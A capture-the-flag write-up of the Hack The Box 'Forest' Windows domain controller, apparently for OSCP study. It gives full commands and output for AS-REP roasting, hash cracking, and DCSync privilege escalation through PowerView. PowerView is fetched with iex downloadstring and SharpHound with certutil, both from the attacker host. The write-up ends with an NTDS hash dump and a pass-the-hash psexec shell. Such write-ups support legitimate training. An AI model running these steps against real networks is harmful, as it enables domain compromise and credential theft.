---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/course-review/cyber-security-courses-journey/oscp-journey/ctf/hack-the-box/window-boxes/forest-easy
---

# ✅ Forest (Easy)

## Lesson Learn

![](<../../../../../../.gitbook/assets/Forest (1).PNG>)

## Report-Penetration

**Vulnerable Exploit:** ASREP Roasting

**System Vulnerable:** 10.10.10.161

**Vulnerability Explanation:** By enumerating on rpcclient, we could collection all validate user in the environment and perform ASREP Roasting and crack the hash for plaintext password.&#x20;

**Privilege Escalation Vulnerability:** DCSync Attack

**Vulnerability Fix:** Implement strong password policy and review group permission

**Severity:** High

**Step to Compromise the Host:**&#x20;

## Reconnaissance

```
 nmap -p- -sC -sV -T4 10.10.10.161    
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-30 09:12 EST
Nmap scan report for 10.10.10.161
Host is up (0.048s latency).
Not shown: 65516 closed ports
PORT      STATE SERVICE      VERSION
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-11-30 14:20:14Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h46m52s, deviation: 4h37m10s, median: 6m50s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2021-11-30T06:21:07-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-11-30T14:21:04
|_  start_date: 2021-11-30T14:18:56
```

```
└─$ sudo nmap -sU -p- --min-rate 10000 10.10.10.161
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-30 09:17 EST
Warning: 10.10.10.161 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.161
Host is up (0.053s latency).
Not shown: 65460 open|filtered ports, 73 closed ports
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp
```

## Enumeration

### Port 53 domain

Verify and Resolve domain. We got **forest.htb.local** and **htb.local**.

```
└─$ dig @10.10.10.161 htb.local

; <<>> DiG 9.16.15-Debian <<>> @10.10.10.161 htb.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 48885
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: ae506a29b6432cc8 (echoed)
;; QUESTION SECTION:
;htb.local.                     IN      A

;; ANSWER SECTION:
htb.local.              600     IN      A       10.10.10.161

;; Query time: 44 msec
;; SERVER: 10.10.10.161#53(10.10.10.161)
;; WHEN: Tue Nov 30 09:21:17 EST 2021
;; MSG SIZE  rcvd: 66

└─$ dig @10.10.10.161 forest.htb.local

; <<>> DiG 9.16.15-Debian <<>> @10.10.10.161 forest.htb.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 34447
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: 1a5babe9864543bb (echoed)
;; QUESTION SECTION:
;forest.htb.local.              IN      A

;; ANSWER SECTION:
forest.htb.local.       3600    IN      A       10.10.10.161

;; Query time: 52 msec
;; SERVER: 10.10.10.161#53(10.10.10.161)
;; WHEN: Tue Nov 30 09:21:48 EST 2021
;; MSG SIZE  rcvd: 73
```

### Port 445 SMB

```
└─$ smbmap -H 10.10.10.161                      
[+] IP: 10.10.10.161:445        Name: 10.10.10.161  

└─$ smbclient -L 10.10.10.161                      
Enter WORKGROUP\pwned's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

### Port 135 RPC

We connect to rpcclient with null auth. There are a lot of command we can query.

```
└─$ rpcclient -U "" -N 10.10.10.161
rpcclient $> 
```

Enumerate user with **enumdomusers**

```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

Enumerate group with **enumdomgroups**

```
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]

```

We can enumerate member of the group and information about user

```
rpcclient $> querygroup 0x200
        Group Name:     Domain Admins
        Description:    Designated administrators of the domain
        Group Attribute:7
        Num Members:1
rpcclient $> queryuser 0x1f4
        User Name   :   Administrator                                                                                                                                                         
        Full Name   :   Administrator                                                                                                                                                         
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Built-in account for administering the computer/domain
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Tue, 30 Nov 2021 09:19:49 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 31 Dec 1969 19:00:00 EST
        Password last set Time   :      Mon, 30 Aug 2021 20:51:59 EDT
        Password can change Time :      Tue, 31 Aug 2021 20:51:59 EDT
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x1f4
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000061
        padding1[0..7]...
        logon_hrs[0..21]...
```

Now we have a list of user which we will sort out SM and Health first.

```
└─$ cat list.txt                                         
Administrator 
Guest 
krbtgt 
DefaultAccount 
$331000-VK4ADACQNUCA 
sebastien 
lucinda 
svc-alfresco 
andy 
mark 
santi 
```

## Exploitation

### Kerberos PreAuth

```
for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done
```

```
└─$ GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2021-12-01 23:24:18.040761  2019-09-23 07:09:47.931194  0x410200 



$krb5asrep$23$svc-alfresco@HTB.LOCAL:a52e636193d12145097e8f2524ac0f4d$3f29792b23db98ed54a73eabaf314b7c7202ea7fea0e8ac1cedcaf942380c02bb0e99d3c23f1c9270228dae515ef96c5c4ab15f1f4d72c8f2c69566b7e41c395fedb681792b68e5c4eeb0ace32700fdf0494c00f3acad174af2ece5af3c2be845b4ba55b4892be0d0f4eacfc0d5cd1a8b356c89e433abdc826a37f034cc33d2222503d5f0cb50551eb3fe013f9a15b44209f4ac4cd378446ab1ca8365e50556bf89d45ba98e1e02d11dcd805698f0745e820cb86db5382b50ff765a17b536fbcf744767811b6bbd3fe8f67b48fce721cab65d047e75044eabba39b72739931e9b9561e3c3d3a
```

**Crack hash**

```
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt                                                                                                                           255 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:14 DONE (2021-12-01 23:22) 0.06863g/s 280419p/s 280419c/s 280419C/s s3s1k2..s3rj12
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

**Crackmapexec** to verify credential

```
└─$ crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 

└─$ crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice -d htb.local
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
```

### **Evil-Winrm**

![](<../../../../../../.gitbook/assets/image (500).png>)

## Privilege Escalation

![](<../../../../../../.gitbook/assets/image (835).png>)

Start HTTP Server to share Sharphound.exe file for enumerate on domain.

```
python -m SimpleHTTPServer 80
```

We have full permission on user svc-alfresco folder.

```
*Evil-WinRM* PS C:\Users> icacls svc-alfresco
svc-alfresco NT AUTHORITY\SYSTEM:(OI)(CI)(F)
             BUILTIN\Administrators:(OI)(CI)(F)
             HTB\svc-alfresco:(OI)(CI)(F)
```

Let download and execute sharphound.exe

```
*Evil-WinRM* PS C:\Users\svc-alfresco> cd Desktop
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> certutil -f -urlcache http://10.10.14.7/SharpHound.exe C:\Users\svc-alfresco\Desktop\SharpHound.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> .\SharpHound.exe
-----------------------------------------------
Initializing SharpHound at 8:58 PM on 12/1/2021
-----------------------------------------------

Resolved Collection Methods: Group, Sessions, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain HTB.LOCAL using path CN=Schema,CN=Configuration,DC=htb,DC=local
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 21 MB RAM
Status: 123 objects finished (+123 61.5)/s -- Using 28 MB RAM
Enumeration finished in 00:00:02.6585612
Compressing data to .\20211201205838_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 8:58 PM on 12/1/2021! Happy Graphing!
```

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> dir


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        12/1/2021   8:58 PM          15209 20211201205838_BloodHound.zip
-a----        12/1/2021   8:58 PM          23611 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----        12/1/2021   8:58 PM         833024 SharpHound.exe
-ar---        12/1/2021   8:19 PM             34 user.txt
```

Let start smb server on our kali machine and transfer file from our victim machine.

```
└─$ impacket-smbserver share .           
Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.161,51929)
[*] AUTHENTICATE_MESSAGE (\,FOREST)
[*] User FOREST\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
```

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> mv 20211201205838_BloodHound.zip \\10.10.14.7\share
```

Start Bloodhound

```
└─$ sudo neo4j console                                                                                                                                                                    1 ⨯
[sudo] password for pwned: 
Directories in use:
  home:         /usr/share/neo4j
  config:       /usr/share/neo4j/conf
  logs:         /usr/share/neo4j/logs
  plugins:      /usr/share/neo4j/plugins
  import:       /usr/share/neo4j/import
  data:         /usr/share/neo4j/data
  certificates: /usr/share/neo4j/certificates
  run:          /usr/share/neo4j/run
Starting Neo4j.
WARNING: Max 1024 open files allowed, minimum of 40000 recommended. See the Neo4j manual.
2021-12-02 05:00:11.371+0000 INFO  Starting...
2021-12-02 05:00:18.668+0000 INFO  ======== Neo4j 4.2.1 ========
2021-12-02 05:00:21.510+0000 INFO  Performing postInitialization step for component 'security-users' with version 2 and status CURRENT
2021-12-02 05:00:21.510+0000 INFO  Updating the initial password in component 'security-users'  
2021-12-02 05:00:22.036+0000 INFO  Bolt enabled on localhost:7687.
2021-12-02 05:00:25.919+0000 INFO  Remote interface available at http://localhost:7474/
2021-12-02 05:00:25.920+0000 INFO  Started.
```

![](<../../../../../../.gitbook/assets/image (328).png>)

```
└─$ bloodhound           
(node:4000) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.
```

Shortest Path to Domain Admin

![](<../../../../../../.gitbook/assets/image (303).png>)

It's part of account operators group. We can create a new user and assign to group.

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net user salt P@ssw0rd123 /domain /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net user /domain

User accounts for \\

-------------------------------------------------------------------------------
$331000-VK4ADACQNUCA     Administrator            andy
DefaultAccount           Guest                    HealthMailbox0659cc1
HealthMailbox670628e     HealthMailbox6ded678     HealthMailbox7108a4e
HealthMailbox83d6781     HealthMailbox968e74d     HealthMailboxb01ac64
HealthMailboxc0a90c9     HealthMailboxc3d7722     HealthMailboxfc9daad
HealthMailboxfd87238     krbtgt                   lucinda
mark                     salt                     santi
sebastien                SM_1b41c9286325456bb     SM_1ffab36a2f5f479cb
SM_2c8eef0a09b545acb     SM_681f53d4942840e18     SM_75a538d3025e4db9a
SM_7c96b981967141ebb     SM_9b69f1b9d2cc45549     SM_c75ee099d0a64c91b
SM_ca8c2ed5bdab4dc9b     svc-alfresco
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net group "Exchange Windows Permissions" /add salt
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net group "Exchange Windows Permissions"
Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members

-------------------------------------------------------------------------------
salt
The command completed successfully.
```

![](<../../../../../../.gitbook/assets/image (539).png>)

Let download powerview to exploit DcSync privileges.

Let start our HTTP Server to share Powerview and download to execute on victim machine.

```
python -m SimpleHTTPServer 80
```

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> iex(new-object net.webclient).downloadstring('http://10.10.14.7/PowerView_dev.ps1')
```

```
$pass = convertto-securestring 'P@ssw0rd123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\salt', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity salt -Rights DCSync
```

Let run secretdump to dump all the hash with user salt.

```
└─$ impacket-secretsdump htb/salt:P@ssw0rd123@10.10.10.161
Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright 2021 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

run psexec&#x20;

```
└─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file CSzqBLaf.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service pSkl on 10.10.10.161.....
[*] Starting service pSkl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```
